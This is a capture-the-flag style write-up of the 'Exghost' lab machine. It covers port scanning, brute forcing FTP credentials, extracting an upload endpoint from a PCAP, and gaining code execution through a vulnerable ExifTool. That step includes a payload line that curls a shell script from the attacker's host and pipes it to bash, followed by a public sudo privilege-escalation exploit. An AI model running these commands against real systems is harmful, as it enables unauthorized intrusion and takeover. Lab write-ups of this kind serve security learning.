# Exghost

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.183.183
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 20:36 +08
Nmap scan report for 192.168.183.183
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE  SERVICE
21/tcp open   ftp
80/tcp open   http
```

FTP and HTTP.

### Port 80 Dead End

Port 80 just shows a 403 page:

<figure><img src="../../../.gitbook/assets/image (602).png" alt=""><figcaption></figcaption></figure>

Running directory scans only shows one directory:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.183.183 -t 100      
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.183.183
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/11 20:54:36 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 320] [--> http://192.168.183.183/uploads/]
```

### FTP Brute Force --> Wireshark

Anonymous credentials don't work with this FTP system, and because we had no other choice, I started brute forcing the FTP login with `hydra`. This took quite a while, but eventually I found some credentials:

{% code overflow="wrap" %}
```
$ hydra -I -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/seclists/Passwords/cirt-default-passwords.txt 192.168.183.183 ftp

[21][ftp] host: 192.168.183.183  login: user  password: system
```
{% endcode %}

Great! Now we can login and view the files present:

```
$ ftp 192.168.183.183 
Connected to 192.168.183.183.
220 (vsFTPd 3.0.3)
Name (192.168.183.183:kali): user
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0          126151 Jan 27  2022 backup
```

The `backup` file was a PCAP file:

{% code overflow="wrap" %}
```
$ file backup         
backup: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```
{% endcode %}

We can open this up in `wireshark` and view the TCP streams. Within TCP Stream 1, we can find this HTTP request:

<figure><img src="../../../.gitbook/assets/image (1661).png" alt=""><figcaption></figcaption></figure>

Seems that we are able to upload files through POST requests at `exiftest.php`:

```
$ curl http://192.168.183.183/exiftest.php
There is no file to upload.
```

From the PCAP file, we can actually export the `exiftest.php` file:

<figure><img src="../../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>

Interestingly the second `exiftest.php` was the response, and here's the contents:

```
$ cat exiftest\(1\).php 
File uploaded successfully :)<pre>ExifTool Version Number         : 12.23
File Name                       : phpopnW14.jpg
Directory                       : /var/www/html/uploads
File Size                       : 14 KiB
File Modification Date/Time     : 2022:01:27 14:47:37+02:00
File Access Date/Time           : 2022:01:27 14:47:37+02:00
File Inode Change Date/Time     : 2022:01:27 14:47:37+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 120
Y Resolution                    : 120
Image Width                     : 253
Image Height                    : 257
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 253x257
Megapixels                      : 0.065
</pre>
```

### File Upload --> Exiftool RCE

It appears that the website is accepting images, and then running `exiftool` on it as a response. This version of `exiftool` is vulnerable to an RCE exploit.&#x20;

{% embed url="https://github.com/OneSecCyber/JPEG_RCE" %}

We can create the payload by following the PoC:

```
$ exiftool -config eval.config runme.jpg -eval='system("curl 192.168.45.184/shell.sh|bash")'
    1 image files updated
```

We can then upload it using this script:

```python
import requests
url = 'http://192.168.183.183/exiftest.php'
files = {'myFile': open('runme.jpg', 'rb')}
print(requests.post(url, files=files).text)
```

After uploading it, we would get a shell as `www-data`:

<figure><img src="../../../.gitbook/assets/image (1641).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sudo Exploit --> Root

I ran a `linpeas.sh` scan on the machine. This found that `sudo` was outdated:

```
[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                 
Sudo version 1.8.31
```

{% embed url="https://github.com/joeammond/CVE-2021-4034" %}

We can just download the Python script and execute it to get a `root` shell:

<figure><img src="../../../.gitbook/assets/image (3425).png" alt=""><figcaption></figcaption></figure>
